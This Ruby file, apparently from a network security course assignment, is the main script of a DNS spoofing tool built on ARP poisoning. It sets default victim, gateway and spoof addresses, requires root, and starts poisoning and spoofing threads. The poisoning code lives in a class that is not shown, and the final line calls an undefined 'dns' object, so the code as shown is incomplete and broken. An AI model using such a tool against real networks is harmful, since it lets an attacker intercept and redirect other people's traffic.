#!/usr/bin/env ruby
# ================================================================================================ 
# main.rb
# 
# Andrew Maledy
# COMP 8505 - Assignment 3
# 
# DNS spoofing application which relies on ARP poisoning in order to analyse all traffic and 
# respond to DNS queries.
#
# ================================================================================================
require 'rubygems'
require 'packetfu'
require 'trollop'
require 'ARP' # our class to handle arp poisoning. 
#require 'dns'

opts = Trollop::options do
    version "DNS Spoof by Andrew Maledy"
    banner <<-EOS
DNS Spoofer in Ruby.

Usage:
    ruby main.rb [options]
    EOS
    
    opt :host, "Victim IP", :short => "h", :type => :string, :default => "192.168.1.72" # String --host <s>, default 127.0.0.1
    opt :mac, "Victim MAC", :short => "m", :type => :string # String --mac <s>
    opt :spoof, "Spoofig IP", :short => "s", :type => :string, :default => "70.70.242.254" # String --spoof <s>, default 70.70.242.254
    opt :gate, "Gateway", :short => "g", :type => :string, :default => "192.168.1.254" # String --gate <s>, default 192.168.0.100
    opt :iface, "Interface", :short => "i", :type => :string, :default => "wlan0" # String --iface <s>, default em1
    opt :route, "Router MAC", :short => "r", :type => :string, :default => "00:1a:6d:38:15:ff"
end
if Process.uid != 0
	raise "Application must be run as root."
end

arp = ARP.new(opts[:host], opts[:mac], opts[:gate], opts[:route], opts[:iface])

t_arp = Thread.new { arp.poison }
t_dns = Thread.new (dns.spoof)
